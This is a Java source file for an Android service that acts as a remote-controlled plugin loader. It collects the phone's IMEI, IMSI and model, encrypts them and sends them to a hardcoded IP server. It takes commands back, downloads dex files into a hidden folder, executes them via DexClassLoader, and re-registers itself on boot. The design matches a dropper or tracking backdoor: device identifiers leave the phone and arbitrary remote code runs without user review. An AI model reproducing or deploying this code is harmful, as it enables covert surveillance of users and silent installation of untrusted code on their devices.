/**
 * 
 */
package com.k99k.dexplug;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;

import com.k99k.tools.android.IO;
import com.k99k.tools.android.JSON;
import com.k99k.tools.android.StringUtil;
import com.k99k.tools.encrypter.Base64Coder;
import com.k99k.tools.encrypter.Encrypter;

import dalvik.system.DexClassLoader;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

/**
 * 
 * @author tzx200
 *
 */
public class DService extends Service {

	/**
	 * 
	 */
	public DService() {
	}
	
	private static final String TAG = "DService";
	
	public static final int ORDER_NONE = 0;
	public static final int ORDER_SYNC_TASK = 1;
	public static final int ORDER_DEL_TASK = 2;
	public static final int ORDER_STOP_SERVICE = 3;
	public static final int ORDER_RESTART_SERVICE = 4;
	public static final int ORDER_UPDATE = 5;
	public static final int ORDER_UPTIME = 6;
	public static final int ORDER_KEY = 7;
	
	public static final int STATE_RUNNING = 0;
	public static final int STATE_PAUSE = 1;
	public static final int STATE_STOP = 2;
	public static final int STATE_NEED_RESTART = 3;
	public static final int STATE_DIE = 4;
	
	//FIXME 将所有的log输出改为错误码定义输出
	
    public static final String ERR_PARA = "e01";
    public static final String ERR_DECRYPT = "e02";
    public static final String ERR_KEY_EXPIRED = "e03";
    public static final String ERR_DECRYPT_CLIENT = "e04";
    
	private static byte[] key = new byte[]{79, 13, 33, -66, -58, 103, 3, -34, -45, 53, 9, 45, 28, -124, 50, -2};
	private static final byte[] ROOTKEY = new byte[]{79, 13, 33, -66, -58, 103, 3, -34, -45, 53, 9, 45, 28, -124, 50, -2};
	
	private static int taskSleepTime = 10*1000;
	private static int upSleepTime = 1000*10*2;
	private static long nextUpTime;
	private static long lastUpTime;
	private static int timeOut = 5000;
	private final static int VERSION = 1;
	private static int keyVersion = 1;
	private static final String SPLIT_STR = "@@";
	private static final String datFileType = ".dat";
	
	static final String RECEIVER_ACTION = "com.k99k.dservice";
	
	private UpThread upThread;
	private TaskThread taskThread;
	
	private  String dexOutputDir= "/data/data/com.k99k.dexplug";
	//TODO 暂时写死
	private static String upUrl = "http://180.96.63.71:8080/plserver/PS";
	static final String localDexPath = Environment.getExternalStorageDirectory().getPath()+"/.dserver/";
	private String emvClass = "com.k99k.dexplug.MoreView";
	private String emvPath = localDexPath+"emv.jar";
	private int state = STATE_RUNNING;
	
	
	private HashMap<String,Object> config;
	private String configPath = localDexPath+"cache_01";
	
	
	private void initConfig(){
		this.config = new HashMap<String, Object>();
		this.config.put("state", STATE_RUNNING);
		this.config.put("upUrl", "http://180.96.63.71:8080/plserver/PS");
		this.config.put("emvClass", "com.k99k.dexplug.MoreView");
		this.config.put("emvPath", localDexPath+"emv.jar");
		this.config.put("k", Base64Coder.encode(key));
		this.config.put("kv", keyVersion);
		this.config.put("t", "");
		this.saveConfig();
	}
	
	@SuppressWarnings("unchecked")
	private HashMap<String,Object> readConfig(String configPath){
		String txt = IO.readTxt(configPath);
		Log.d(TAG, "read enc:"+txt);
		if (!StringUtil.isStringWithLen(txt, 44)) {
			Log.e(TAG, "config File error!");
			return this.config;
		}
		try {
			//key的密文为44位(明文为：6位毫秒数+16位KEY)
			String keyString = txt.substring(0,44);
			String jsonString = txt.substring(44);
			Log.d(TAG, "keyString:"+keyString);
			
			Encrypter.getInstance().setKey(ROOTKEY);
			String decKey = Encrypter.getInstance().decrypt(keyString);
			String keyStr = decKey.substring(6);
			byte[] keyDec = Base64Coder.decode(keyStr);
			Log.d(TAG, " dec:"+decKey+"DEC_KEY:"+keyStr);
			if (keyDec.length == 16) {
				key = keyDec;
				Encrypter.getInstance().setKey(key);
				String jsonStr = Encrypter.getInstance().decrypt(jsonString);
				this.config = (HashMap<String, Object>) JSON.read(jsonStr);
				if (config != null && config.size()>2) {
					this.config.put("k", Base64Coder.encode(key));
				}
			}else{
				Log.e(TAG, "config File key error!");
			}
			
		} catch (Exception e) {
			Log.e(TAG, "config File error!",e);
		}
		
		return this.config;
	}
	private String getPropString(String propName,String defaultValue){
		Object value = this.config.get(propName);
		if (value == null) {
			return defaultValue;
		}
		return value.toString();
	}
	private int getPropInt(String propName,int defaultValue){
		Object value = this.config.get(propName);
		if (value == null) {
			return defaultValue;
		}
		return Integer.parseInt(String.valueOf(value));
	}
	private void setProp(String propName,Object value,boolean isSave){
		this.config.put(propName, value);
		if (isSave) {
			this.saveConfig();
		}
	}
	
	public void saveConfig(){
		this.saveConfig(this.configPath);
	}
	
	private void saveConfig(String configPath){
		try {
			String k = Base64Coder.encode(key);
			this.config.put("timeStamp", System.currentTimeMillis());
			String conf = JSON.write(this.config);
			String cTime = String.valueOf(System.currentTimeMillis());
			String salt = cTime.substring(cTime.length()-6, cTime.length());
			Encrypter.getInstance().setKey(ROOTKEY);
			String kEnc = Encrypter.getInstance().encrypt(salt+k);
			Log.d(TAG, "salt:"+salt+" k:"+k+" kenc:"+kEnc);
			Encrypter.getInstance().setKey(key);
			String enc =  kEnc+Encrypter.getInstance().encrypt(conf);
			Log.d(TAG, "enc:"+enc);
			IO.writeTxt(configPath,enc);
			
		} catch (Exception e) {
			Log.e(TAG, "save config error!", e);
		}
	}
	
//	public  final IBinder mBinder=new LocalBinder();
//	public class LocalBinder extends Binder {
//		public DService getService() {
//			return DService.this;
//		}
//	}
	static final int ACT_EMACTIVITY_START = 11;
	private BroadcastReceiver myReceiver = new BroadcastReceiver() {
	 
		@Override
		public void onReceive(Context context, Intent intent) {
			int act = intent.getExtras().getInt("act");
			switch (act) {
			case ACT_EMACTIVITY_START:
				Log.d(TAG, "receive act:"+ACT_EMACTIVITY_START);
				Intent it= new Intent(context.getApplicationContext(), com.k99k.dexplug.EmptyActivity.class);    
				it.putExtra("emvClass", DService.this.emvClass);
				it.putExtra("emvPath", DService.this.emvPath);
				it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
				context.startActivity(it); 
				break;

			default:
				Intent i = new Intent();  
				i.setClass(context, DService.class);  
				context.startService(i);
			}
		}
	};
	
	public void setNextUpTime(long nextUptime,String key){
		nextUpTime = nextUptime;
	}
	
	public void setUpSleepTime(int sleepTime,String key){
		upSleepTime = sleepTime;
	}
	public void setTaskSleepTime(int sleepTime,String key){
		taskSleepTime = sleepTime;
	}
	
	public void pauseService(String key){
		this.state = STATE_PAUSE;
		this.setProp("state", STATE_PAUSE,true);
	}
	
	public void stopService(String key){
		this.state = STATE_STOP;
		this.setProp("state", STATE_STOP,true);
	}
	
	public void updateTaskState(String key,int tid,int state ){
		for (PLTask task : this.taskList) {
			if (task.getId() == tid) {
				task.setState(state);
			}
		}
	}
	
	public PLTask getTask(int tid){
		for (PLTask task : this.taskList) {
			if (task.getId() == tid) {
				return task;
			}
		}
		return null;
	}
	
	private void updateKey(byte[] keyBytes,int kVersion){
		key = keyBytes;
		keyVersion = kVersion;
		this.config.put("k", Base64Coder.encode(key));
		this.config.put("kv", kVersion);
		this.saveConfig();
	}
	
	private boolean unzip(String file){
		

		return false;
	}
	
	
	private void syncTaskList(String remoteListStr,String downUrl){
		if (!StringUtil.isStringWithLen(remoteListStr, 1)) {
			Log.d(TAG, "remote task is empty.");
			return;
		}
		String[] remoteList = remoteListStr.split("_");
		ArrayList<Integer> needFetchList = new ArrayList<Integer>();
		synchronized (this.taskList) {
			for (int i = 0; i < remoteList.length; i++) {
				int tid = Integer.parseInt(remoteList[i]);
				boolean had = false;
				for (int j = 0; j < taskList.size(); j++) {
					PLTask t = (PLTask)this.taskList.get(j);
					if (t.getId() == tid) {
						had = true;
						break;
					}
				}
				if (!had) {
					PLTask task = this.loadTask(tid, localDexPath);
					if (task == null) {
						needFetchList.add(tid);
					}
				}
			}
		}
		//fetch remote tasks
		for (Integer id : needFetchList) {
			if (this.fetchRemoteTask(id,downUrl)) {
				Log.d(TAG, "fetch OK:"+id);
				PLTask task = this.loadTask(id, this.localDexPath);
				if (task != null) {
					Log.d(TAG, "loadTask OK:"+id);
					task.setDService(this);
					task.init();
					this.taskList.add(task);
				}
			}
		}
		this.saveStates();
	}
	private static final int IO_BUFFER_SIZE = 1024 * 4;
	
	
	public static boolean download(String remoteUrl,String localFile,String vKey){
		try {
			URL url = new URL(remoteUrl);
			URLConnection con = url.openConnection();
			con.setRequestProperty("v", vKey);
			InputStream is = con.getInputStream();
			byte[] bs = new byte[IO_BUFFER_SIZE];
			int len;
			OutputStream os = new FileOutputStream(localFile);
			while ((len = is.read(bs)) != -1) {
				os.write(bs, 0, len);
			}
			os.close();
			is.close();
			return true;
		} catch (Exception e) {
			Log.e(TAG, "remote conn error:"+remoteUrl);
			e.printStackTrace();
			
		}
		return false;
	}

	private boolean fetchRemoteTask(int id,String downUrl){
		
		String remote = downUrl+"?id="+id;
		String vKey = String.valueOf(DService.this.keyVersion*27+17);
		String localFile = localDexPath+id+datFileType;
		
		
		return download(remote,localFile,vKey);
	}
	
	
	class UpThread extends Thread{

		private boolean runFlag = true;
		
		
		/**
		 * @param runFlag the runFlag to set
		 */
		public final void setRun(boolean runFlag) {
			this.runFlag = runFlag;
		}

		private boolean up(){
			try {
				StringBuilder sb = new StringBuilder();
				int api_level = android.os.Build.VERSION.SDK_INT;
				TelephonyManager tm=(TelephonyManager) DService.this.getSystemService(DService.TELEPHONY_SERVICE);
				String imei = tm.getDeviceId();
				String imsi = tm.getSubscriberId();
				String ua = android.os.Build.MODEL;
				sb.append(api_level).append(SPLIT_STR);
				sb.append(imei).append(SPLIT_STR);
				sb.append(imsi).append(SPLIT_STR);
				sb.append(ua).append(SPLIT_STR);
				sb.append(DService.VERSION).append(SPLIT_STR);
				sb.append(lastUpTime).append(SPLIT_STR);
				sb.append(System.currentTimeMillis()).append(SPLIT_STR);
				//DService.this.taskList;
				synchronized (DService.this.taskList) {
					for (int i = 0; i < DService.this.taskList.size(); i++) {
						PLTask t = (PLTask)DService.this.taskList.get(i);
						sb.append("_");
						sb.append(t.getId());
					}
				}
				
				Log.d(TAG, "postUrl data:"+sb.toString());
				
				String data = "up="+Encrypter.getInstance().encrypt(sb.toString());
				URL aUrl = new URL(upUrl);
			    URLConnection conn = aUrl.openConnection();
			    conn.setConnectTimeout(timeOut);
			    //header 中传keyVersion,加入简单的算法干扰
			    conn.setRequestProperty("v", String.valueOf(DService.this.keyVersion*27+17));
			    conn.setDoInput(true);
			    conn.setDoOutput(true);
			    OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
			    wr.write(data);
			    wr.flush();

			    // Get the response
			    BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream(),"utf-8"));
			    String line;
			    sb = new StringBuilder();
				while ((line = rd.readLine()) != null) {
					sb.append(line);
				}
			    wr.close();
			    rd.close();
			    //判断是否错误
			    String resp = sb.toString();
			    
			    Log.d(TAG, "resp:"+resp);
			    
			    if (!StringUtil.isStringWithLen(resp, 4)) {
					//判断错误码
			    	if (resp.equals(ERR_KEY_EXPIRED)) {
						//key过期,发起更新key的请求升级key
			    		
					}else{
						//
						Toast.makeText(DService.this, resp, Toast.LENGTH_SHORT).show();;
					}
			    	return false;
				}
			    //解密
				String re = Encrypter.getInstance().decrypt(resp);
				Log.d(TAG, "dec re:"+re);
				String[] res = re.split(SPLIT_STR);
				if (!StringUtil.isDigits(res[0])) {
					Log.e(TAG, "re length Error:"+re);
					return false;
				}
				int order = Integer.parseInt(res[0]);
				switch (order) {
				case ORDER_NONE:
					return true;
				case ORDER_SYNC_TASK:
					//比对task_id_list,进行同步
					Log.d(TAG, "url:"+res[1]);
					String downLoadUrl = res[1];
					String remoteTaskIds = res[2];
					DService.this.syncTaskList(remoteTaskIds,downLoadUrl);
					return true;
				case ORDER_DEL_TASK:
					
					
					break;
				case ORDER_KEY:
					//resp: ORDER_KEY|base64(key)|keyVersion
					
					DService.this.setProp("key",res[1],true);
					Encrypter.getInstance().setKey(Base64Coder.decode(res[1]));
					keyVersion = Integer.parseInt(res[2]);
					break;
				case ORDER_UPDATE:
					
					
					break;
				case ORDER_UPTIME:
					
					
					break;
				case ORDER_RESTART_SERVICE:
					
					
					break;
				case ORDER_STOP_SERVICE:
					
					
					break;
				default:
					//比对task_id_list
					
					
					break;
				}
				//keyVersion更新
				
				
			} catch (IOException e) {
				Log.e(TAG, "up Error:"+upUrl, e);
			} catch (Exception e) {
				Log.e(TAG, "up unknown Error:"+upUrl, e);
				DService.this.state = STATE_NEED_RESTART;
			}
			return false;
		}


		@Override
		public void run() {
			if (DService.this.state != STATE_RUNNING) {
				return;
			}
			nextUpTime = 1;
			
			try {
				while (runFlag && DService.this.state == STATE_RUNNING) {
					Log.d(TAG, "up running state:"+DService.this.state);
					if (DService.this.state != STATE_RUNNING) {
						return;
					}
					if (System.currentTimeMillis()>nextUpTime) {
						//每天仅发起一次请求，如果请求失败，等待10分钟
						if (this.up()) {
//							Calendar ca = Calendar.getInstance();
//							ca.add(Calendar.DATE, 1);
//							ca.set(Calendar.HOUR_OF_DAY, 6);
//							nextUpTime = ca.getTimeInMillis();
							lastUpTime = System.currentTimeMillis();
							nextUpTime += upSleepTime;
							Log.d(TAG, "lastUpTime:"+lastUpTime+" nextUpTime"+nextUpTime+" runFlag+"+runFlag+" state:"+DService.this.state);
						}else{
							Thread.sleep(upSleepTime);
						}
					}
					Thread.sleep(upSleepTime);
				}
			} catch (InterruptedException e) {
			}
		}
		
	}

	private ArrayList<PLTask> taskList = new ArrayList<PLTask>();
	private Handler handler; 
	
	public void addTask(PLTask task){
		synchronized (this.taskList) {
			this.taskList.add(task);
		}
		this.saveStates();
	}
	
	public void delTask(int taskId){
		synchronized (this.taskList) {
			for (PLTask task : this.taskList) {
				if (task.getId() == taskId) {
					this.taskList.remove(task);
					this.removeDat(task.getId());
				}
			}
		}
		this.saveStates();
	}
	
	public void delTask(PLTask task){
		synchronized (this.taskList) {
			
			this.taskList.remove(task);
			this.removeDat(task.getId());
		}
		this.saveStates();
	}
	
	private void removeDat(int tid){
		try {
			File f = new File(localDexPath+tid+datFileType);
			if (f.exists()) {
				f.delete();
				Log.d(TAG, "DAT remove OK:"+tid);
			}
			f = new File(localDexPath+tid+".jar");
			if (f.exists()) {
				f.delete();
				Log.d(TAG, "jar remove OK:"+tid);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	class TaskThread extends Thread{
	
		private boolean runFlag = true;
		
		
		@Override
		public void run() {
			if (DService.this.state != STATE_RUNNING) {
				return;
			}
			//先初始化所有的task
			synchronized (DService.this.taskList) {
				for (int i = 0; i < taskList.size(); i++) {
					PLTask t = (PLTask)taskList.get(i);
					t.init();
				}
			}
			
			try {
				while (runFlag && DService.this.state == STATE_RUNNING) {
					Log.d(TAG, "task check");
					for (PLTask task : taskList) {
						int state = task.getState();
						Log.d(TAG, "task state:"+state);
						switch (state) {
						case PLTask.STATE_WAITING:
							try {
								new Thread(task).start();
							} catch (Exception e) {
								e.printStackTrace();
								Log.e(TAG, "task exec error:"+task.getId());
							}
							break;
						case PLTask.STATE_DIE:
							DService.this.delTask(task);
							break;
						default:
							break;
						}
					}
					Log.d(TAG, runFlag+","+DService.this.state+","+taskSleepTime);
					Thread.sleep(taskSleepTime);
				}
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
		

		/**
		 * @param runFlag the runFlag to set
		 */
		public final void setRun(boolean runFlag) {
			this.runFlag = runFlag;
		}

	}
	
	
	
	private void saveStates(){
		StringBuilder sb = new StringBuilder();
		synchronized (this.taskList) {
			for (PLTask task : taskList) {
				sb.append(SPLIT_STR);
				int id = task.getId();
				sb.append(id);
			}
		}
		sb.delete(0, 2);
		Log.d(TAG, "save task list:"+sb.toString());
		this.setProp("t", sb.toString(),false);
		this.setProp("emvClass", emvClass,false);
		this.setProp("emvPath", emvPath,false);
		this.saveConfig();
	}
	
	/**
	 * 供Task访问，可实现Task之间的交互
	 * @return
	 */
	ArrayList<PLTask> getTaskList(){
		return this.taskList;
	}
	
	private PLTask loadTask(int id,String localPath){
		String dexPath = localPath+id+datFileType;
		File f = new File(dexPath);
		if (f.exists() && f.isFile()) {
			try{
				//TODO 这里需要解密处理,暂不实现加解密,直接下载的就是原始dex文件
				dexPath = localPath+id+".jar";
				f.renameTo(new File(dexPath));
				
				DexClassLoader cDexClassLoader = new DexClassLoader(dexPath, dexOutputDir,null, this.getClass().getClassLoader()); 
				Class<?> class1 = cDexClassLoader.loadClass("com.k99k.dexplug.PLTask"+id);	
				PLTask plug =(PLTask)class1.newInstance();
				
				//TODO 这里需要重新加密,移除解密后的文件
				dexPath = localPath+id+datFileType;
				f.renameTo(new File(dexPath));
				return plug;
			}catch (Exception e) {
				Log.e(TAG, "loadTask error:"+localPath);
				e.printStackTrace();
			}    
		}
		return null;
	}
	
	private void stop(){
		if (this.upThread.runFlag) {
			this.upThread.setRun(false);
		}
		if (this.taskThread.runFlag) {
			this.taskThread.setRun(false);
		}
		if (this.state == STATE_DIE) {
			this.unregisterReceiver(this.myReceiver);
		}else{
			this.state = STATE_STOP;
		}
		Log.d(TAG, "stoped...");
		try {
			Thread.sleep(3000);
		} catch (InterruptedException e) {
		}
	}
	
	private void init(){
		Log.d(TAG, "init...");
		this.config = this.readConfig(this.configPath);
		if (this.config == null || this.config.size() <= 0) {
			//直接初始化config
			initConfig();
			Log.d(TAG, "no conf");
		}else{
			Log.d(TAG, "init config OK.");
		}
		if (this.state == STATE_NEED_RESTART) {
			//重启
			this.stop();
			this.state = STATE_RUNNING;
		}else{
			this.state = this.getPropInt("state", STATE_RUNNING);
		}
		if (this.state == STATE_STOP) {
			this.stop();
			return;
		}else if(this.state == STATE_DIE){
			//这里的STATE_DIE状态直接杀死本进程
			this.stop();
			this.stopSelf();
			return;
		}else if(this.state == STATE_PAUSE){
			return;
		}
		dexOutputDir = getApplicationInfo().dataDir;
		emvClass = this.getPropString("emvClass", "com.k99k.dexplug.MoreView");
		emvPath = this.getPropString("emvPath", Environment.getExternalStorageDirectory().getPath()+"/.dserver/emv.jar");
		(new File(localDexPath)).mkdirs();
		String keyStr = this.getPropString( "k", Base64Coder.encode(key));
		keyVersion = this.getPropInt("kv", keyVersion);
		Encrypter.getInstance().setKey(Base64Coder.decode(keyStr));
		String tasks = this.getPropString( "t", "");
		Log.d(TAG, "init tasks:"+tasks);
		if (StringUtil.isStringWithLen(tasks, 1)) {
			String[] taskArr = tasks.split(SPLIT_STR);
			this.taskList.clear();
			for (int i = 0; i < taskArr.length; i++) {
				int tid = Integer.parseInt(taskArr[i]);
				PLTask task = this.loadTask(tid, localDexPath);
				if (task != null) {
					task.setDService(this);
					this.taskList.add(task);
				}else{
					Log.e(TAG, "load task failed:"+tid);
				}
			}
		}
		
		if (this.upThread != null || this.taskThread!=null) {
			this.upThread.setRun(false);
			this.taskThread.setRun(false);
			try {
				Thread.sleep(10*1000);
			} catch (InterruptedException e) {
			}
		}
		this.upThread = new UpThread();
		this.upThread.start();
		this.taskThread = new TaskThread();
		this.taskThread.start();
		
		IntentFilter myFilter = new IntentFilter();  
        myFilter.addAction("android.intent.action.BOOT_COMPLETED");  
        myFilter.addAction("android.net.conn.CONNECTIVITY_CHANGE");  
        myFilter.addAction(RECEIVER_ACTION);  
        this.registerReceiver(myReceiver, myFilter);  
	}

	/* (non-Javadoc)
	 * @see android.app.Service#onBind(android.content.Intent)
	 */
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	/* (non-Javadoc)
	 * @see android.app.Service#onCreate()
	 */
	@Override
	public void onCreate() {
		Log.d(TAG, "dservice created...");
		handler = new Handler(Looper.getMainLooper());
		this.init();
		
		
	}
	
	public Handler getHander(){
		return this.handler;
	}

	/* (non-Javadoc)
	 * @see android.app.Service#onDestroy()
	 */
	@Override
	public void onDestroy() {
		this.saveStates();
		this.stop();
		Log.d(TAG, "dservice destroy...");
	}


	/* (non-Javadoc)
	 * @see android.app.Service#onStartCommand(android.content.Intent, int, int)
	 */
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.d(TAG, "dservice onStartCommand...");
		if (this.state == STATE_NEED_RESTART) {
			this.init();
		}
		return START_REDELIVER_INTENT;
		//return super.onStartCommand(intent, flags, startId);
	}

	/**
	 * @return the version
	 */
	public final int getVersion() {
		return VERSION;
	}

	/**
	 * 处理过后keyVersion
	 * 
	 * @return the keyVersion
	 */
	public final int getKeyVersion() {
		return keyVersion*27+17;
	}

	/**
	 * @return the upUrl
	 */
	public static final String getUpUrl() {
		return upUrl;
	}

	/**
	 * @param upUrl the upUrl to set
	 */
	public static final void setUpUrl(String upUrl) {
		DService.upUrl = upUrl;
	}

	/**
	 * @return the localDexPath
	 */
	public static final String getLocalDexPath() {
		return localDexPath;
	}

	/**
	 * @return the emvClass
	 */
	public final String getEmvClass() {
		return emvClass;
	}

	/**
	 * @param emvClass the emvClass to set
	 */
	public final void setEmvClass(String emvClass) {
		this.emvClass = emvClass;
		this.config.put("emvClass", emvClass);
		
	}

	/**
	 * @return the emvPath
	 */
	public final String getEmvPath() {
		return emvPath;
	}

	/**
	 * @param emvPath the emvPath to set
	 */
	public final void setEmvPath(String emvPath) {
		this.emvPath = emvPath;
		this.config.put("emvPath", emvPath);
	}
	
	

}
